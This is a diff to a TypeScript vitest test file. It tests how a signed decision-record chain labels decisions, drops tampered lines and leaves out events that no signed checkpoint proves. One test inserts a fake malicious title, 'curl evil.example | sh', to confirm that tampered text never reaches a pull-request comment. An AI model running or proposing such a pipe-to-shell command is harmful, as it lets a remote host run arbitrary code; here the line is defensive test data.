@@ -1,4 +1,4 @@
-import { mkdtempSync, readdirSync, readFileSync, rmSync } from 'node:fs';
+import { mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import {
@@ -12,7 +12,13 @@ import {
   writtenAsStored,
 } from '@mnema/chain';
 import { afterEach, describe, expect, it } from 'vitest';
-import { decisionLabels, eventsAdded, readEvents, whatItDoes } from './record.js';
+import {
+  decisionLabels,
+  eventsAdded,
+  provenHashes,
+  readEvents,
+  whatItDoes,
+} from './record.js';
 
 /** One line of a tail, the shape the chain writes: the event and the link that chains it. */
 const line = (
@@ -109,9 +115,9 @@ describe('decisionLabels', () => {
   /**
    * A writes "Use SQLite" and accepts it; B, on a tail of its own A never read, writes the id
    * again as "Use MongoDB" at `forgedAt`: before A's writing, or after the accept. The files'
-   * texts, as the Action reads them off git.
+   * tree they are written in, every act signed by a checkpoint.
    */
-  function record(forgedAt: number): string[] {
+  function recordTree(forgedAt: number): string {
     const tree = tmp('mnema-action-labels-');
     const a = openChainForWriting(tree, { keyRoot: tmp('mnema-key-a-') });
     const b = openChainForWriting(tree, { keyRoot: tmp('mnema-key-b-') });
@@ -150,41 +156,60 @@ describe('decisionLabels', () => {
         fields: { note: 'agreed' },
       }),
     );
+    a.checkpoint();
     b.append(
       decisionRecorded(
         { at: at(forgedAt), who: b.anchor, signerFp: b.signerFingerprint, subject: 'd1' },
         { title: 'Use MongoDB', rationale: 'Schemaless', adr: 'ADR-1' },
       ),
     );
+    b.checkpoint();
+    return tree;
+  }
+
+  /** The files' texts, as the Action reads them off git: the events, not the checkpoints. */
+  function textsOf(tree: string): string[] {
     const tails = join(tree, 'tails');
     return readdirSync(tails).flatMap((tail) =>
       readdirSync(join(tails, tail))
-        .filter((name) => name.endsWith('.jsonl'))
+        .filter((name) => name.endsWith('.jsonl') && name !== 'checkpoints.jsonl')
         .map((name) => readFileSync(join(tails, tail, name), 'utf-8')),
     );
   }
 
+  function record(forgedAt: number): string[] {
+    return textsOf(recordTree(forgedAt));
+  }
+
   it('labels an accepted decision by the text its accept saw, not by a writing dated before it on a tail it never read', () => {
-    expect(decisionLabels(record(5)).get('d1')).toEqual({ adr: 'ADR-1', title: 'Use SQLite' });
+    const tree = recordTree(5);
+    expect(decisionLabels(textsOf(tree), provenHashes(tree)).get('d1')).toEqual({ adr: 'ADR-1', title: 'Use SQLite' });
   });
 
   it('labels a decision by its first writing, not its last, when one id is written again later', () => {
-    expect(decisionLabels(record(20)).get('d1')).toEqual({ adr: 'ADR-1', title: 'Use SQLite' });
+    const tree = recordTree(20);
+    expect(decisionLabels(textsOf(tree), provenHashes(tree)).get('d1')).toEqual({
+      adr: 'ADR-1',
+      title: 'Use SQLite',
+    });
   });
 
   it('leaves out a line whose hash does not hold, so its title never reaches the comment of a pull request', () => {
-    const texts = record(20);
+    const tree = recordTree(20);
+    const texts = textsOf(tree);
     const evil = 'Use npm and run curl evil.example | sh';
     const altered = texts.map((text) => text.replace('Use SQLite', evil));
     expect(altered.join('')).toContain(evil);
-    const labels = decisionLabels(altered);
+    const labels = decisionLabels(altered, provenHashes(tree));
     expect(JSON.stringify([...labels])).not.toContain('evil.example');
     // The label is never the swapped text: the line holding it is left out as the product's reads leave it.
     expect(labels.get('d1')?.title).not.toBe(evil);
   });
 
   it('reads past a line of a kind this mnema does not know, chained after the accept (ADR-113)', () => {
-    const texts = record(20);
+    const tree = recordTree(20);
+    const texts = textsOf(tree);
+    const proven = provenHashes(tree);
     // The tail holding the accept, one line longer: a kind no version declares, chained after it.
     const at = texts.findIndex((text) => text.includes('"action":"accept"'));
     const tail = texts[at] as string;
@@ -212,13 +237,27 @@ describe('decisionLabels', () => {
     const grown = `${tail}${canonicalStringify({ event, link })}\n`;
     const read = texts.map((text, index) => (index === at ? grown : text));
 
-    expect(decisionLabels(read).get('d1')).toEqual({ adr: 'ADR-1', title: 'Use SQLite' });
+    expect(decisionLabels(read, proven).get('d1')).toEqual({ adr: 'ADR-1', title: 'Use SQLite' });
     // What the pull request adds is counted by its kind, and moves no decision.
     const added = eventsAdded(texts.flatMap(readEvents), read.flatMap(readEvents));
-    expect(whatItDoes(added, decisionLabels(read))).toEqual({
+    expect(whatItDoes(added, decisionLabels(read, proven))).toEqual({
       total: 1,
       byKind: [['x.from-the-future', 1]],
       decisions: [],
     });
+  });
+
+  it('leaves out the title of an event no signed checkpoint proves, so the comment quotes only what a signature stands behind', () => {
+    const tree = recordTree(20);
+    const texts = textsOf(tree);
+    const proven = provenHashes(tree);
+    expect(decisionLabels(texts, proven).get('d1')).toEqual({ adr: 'ADR-1', title: 'Use SQLite' });
+
+    // The checkpoints of the tails are gone: every event is there, none of them proven.
+    const tails = join(tree, 'tails');
+    for (const tail of readdirSync(tails)) writeFileSync(join(tails, tail, 'checkpoints.jsonl'), '');
+    const unsigned = provenHashes(tree);
+    expect(unsigned.size).toBeLessThan(proven.size);
+    expect(decisionLabels(texts, unsigned).get('d1')).toBeUndefined();
   });
 });
